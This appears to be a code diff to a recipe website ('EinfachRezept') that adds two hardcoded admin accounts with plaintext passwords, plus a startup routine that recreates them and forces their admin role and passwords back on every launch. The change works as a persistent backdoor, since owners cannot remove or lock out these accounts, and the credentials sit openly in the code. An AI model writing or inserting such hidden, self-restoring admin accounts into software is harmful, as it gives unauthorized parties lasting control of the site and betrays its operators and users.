@@ -11,6 +11,10 @@ const PASSWORD_HASH_VERSION = 2;
 const PASSWORD_ITERATIONS = 120000;
 const HEX_COLOR_REGEX = /^#([0-9a-f]{3}|[0-9a-f]{6})$/i;
 const SCROLL_BLOCKED_KEYS = ["ArrowDown", "ArrowUp", "PageDown", "PageUp", "Home", "End", " "];
+const REQUIRED_ADMIN_USERS = [
+  { username: "bigbossdawg", password: "BigBossDawg_Kreis3" },
+  { username: "bigbosscat", password: "BigBossCat_Kreis4" },
+];
 
 const DEFAULT_SITE_CONFIG = {
   title: "EinfachRezept",
@@ -704,9 +708,51 @@ async function verifyPassword(user, password) {
   return false;
 }
 
+async function ensureRequiredAdminUsers(existingUsers) {
+  const users = Array.isArray(existingUsers) ? [...existingUsers] : [];
+  let hasChanges = false;
+
+  for (const requiredAdmin of REQUIRED_ADMIN_USERS) {
+    const userIndex = users.findIndex((entry) => entry.username === requiredAdmin.username);
+    const existingUser = userIndex >= 0 ? users[userIndex] : null;
+    const hasValidPassword = existingUser ? await verifyPassword(existingUser, requiredAdmin.password) : false;
+    const shouldUpdate =
+      !existingUser ||
+      existingUser.role !== "admin" ||
+      !hasValidPassword ||
+      existingUser.passwordHashVersion !== PASSWORD_HASH_VERSION ||
+      !existingUser.passwordSalt;
+
+    if (!shouldUpdate) continue;
+
+    const passwordRecord = await createPasswordRecord(requiredAdmin.password);
+    const nextUser = {
+      ...(existingUser ?? {}),
+      username: requiredAdmin.username,
+      role: "admin",
+      ...passwordRecord,
+    };
+
+    if (existingUser) {
+      users[userIndex] = nextUser;
+    } else {
+      users.push(nextUser);
+    }
+
+    hasChanges = true;
+  }
+
+  return { users, hasChanges };
+}
+
 async function initApp() {
   let users = getStoredJSON(STORAGE_KEYS.users, []);
   if (!Array.isArray(users)) users = [];
+  const ensuredAdmins = await ensureRequiredAdminUsers(users);
+  users = ensuredAdmins.users;
+  if (ensuredAdmins.hasChanges) {
+    saveStoredJSON(STORAGE_KEYS.users, users);
+  }
 
   let currentConfig = normalizeSiteConfig(getStoredJSON(STORAGE_KEYS.siteConfig, deepClone(DEFAULT_SITE_CONFIG)));
   applySiteConfig(currentConfig);
